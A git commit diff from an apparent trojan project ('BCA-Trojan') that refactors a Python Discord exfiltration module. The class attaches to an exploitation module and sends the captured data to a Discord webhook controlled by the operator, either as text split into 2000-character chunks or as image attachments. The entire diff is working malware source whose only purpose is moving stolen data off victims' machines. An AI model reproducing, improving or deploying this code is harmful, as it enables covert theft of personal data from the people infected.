069e88e54636ab0b7d038e8831a9d26a5b3e779e
EONRaider <livewire_voodoo@protonmail.com>
2021-11-16 12:11:44 -0300

    Refactor Discord class
    Several modifications were made to the class
    and file structure:
    
    - Optimized logic for '_send_message' method
    - Removed 'char_limit' parameter from __init__
    - Renamed '_split_message' method to
    '_slice_message'. Made it static.
    - Moved docstring formatting from Google to
    reStructuredText
    - Modified project URL
    - Modified imports

--- src/modules/exfiltration/discord_server.py
+++ src/modules/exfiltration/discord_server.py
@@ -1,40 +1,30 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/bca-trojan
+# https://github.com/EONRaider/BCA-Trojan
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import asyncio
-from pathlib import Path
+from io import BufferedReader
 from typing import Iterator
 
 import aiohttp
 from discord import File, Webhook, AsyncWebhookAdapter
 
-from src.modules.exploitation.exploitation_module import ExploitationModule
 from src.modules.exfiltration.exfiltration_module import ExfiltrationModule
 
 
 class Discord(ExfiltrationModule):
-    def __init__(self, *,
-                 module: ExploitationModule,
-                 webhook_url: str,
-                 char_limit: int = 2000):
-        """Exfiltrate data to a Discord server.
+    def __init__(self, *, module, webhook_url: str):
+        """Exfiltrate data to a Discord server through a Webhook URL.
 
-        Args:
-            module: Instance of ExploitationModule to which the
-                exfiltrator receive data by attaching itself as a
-                subscriber.
-            webhook_url: URL to the Webhook set up on the Discord
-                server's configuration.
-            char_limit: Number of characters to be sent per message to
-                the Discord server. Set by the service itself and
-                defaults to 2000 characters.
+        :param module: Instance of ExploitationModule from which the
+            exfiltrator receives data by attaching itself to as a
+            subscriber.
+        :param webhook_url: URL to the Webhook set up on the Discord
+            server's configuration.
         """
-
         super().__init__(module)
         self.webhook_url = webhook_url
-        self._char_limit = char_limit
         self._username = self.module.__class__.__name__
 
     def update(self, message: [str, None]) -> None:
@@ -43,25 +33,35 @@ class Discord(ExfiltrationModule):
         if message is not None:
             asyncio.run(self._send_message(message))
 
-    def _split_message(self, message: str) -> Iterator[str]:
-        """Yield an iterator of strings derived from a single string.
+    @staticmethod
+    def _slice_message(message: str,
+                       char_limit: int = 2000) -> Iterator[str]:
+        """Yield an iterator of sliced strings derived from a single
+        string.
+
         Each string yielded corresponds to a sequence of characters with
         length smaller than or equal to the character limit imposed by
-        the Discord service."""
-        yield from (message[start:start+self._char_limit] for start in
-                    range(0, len(message), self._char_limit))
+        the Discord service.
+        Ex: A message with 3310 characters will yield two strings, one
+        with 2000 and another with 1310 characters.
 
-    async def _send_message(self, message: [str, Path]) -> None:
+        :param message: A string defining the message to be split.
+        :param char_limit: Number of characters to be sent per message
+            to the Discord server. Set by the service itself and
+            defaults to 2000 characters.
+        """
+        if not isinstance(message, str):
+            raise TypeError
+        for index in range(0, len(message), char_limit):
+            yield message[index: index + char_limit]
+
+    async def _send_message(self, message: [str, BufferedReader]) -> None:
         async with aiohttp.ClientSession() as session:
             webhook = Webhook.from_url(url=self.webhook_url,
                                        adapter=AsyncWebhookAdapter(session))
-            if isinstance(message, str):     # Message as text
-                for content in self._split_message(message):
-                    await webhook.send(content=content, username=self._username)
-            elif isinstance(message, Path):  # Message as image
-                with open(file=message, mode="rb") as file:
-                    image = File(fp=file)
-                    await webhook.send(file=image, username=self._username)
-            else:
-                raise TypeError("Operation not supported for this type of "
-                                "message.")
+            try:  # Send message as text
+                for part in self._slice_message(message):
+                    await webhook.send(content=part, username=self._username)
+            except TypeError:  # Send message as image attachment
+                await webhook.send(file=File(fp=message),
+                                   username=self._username)
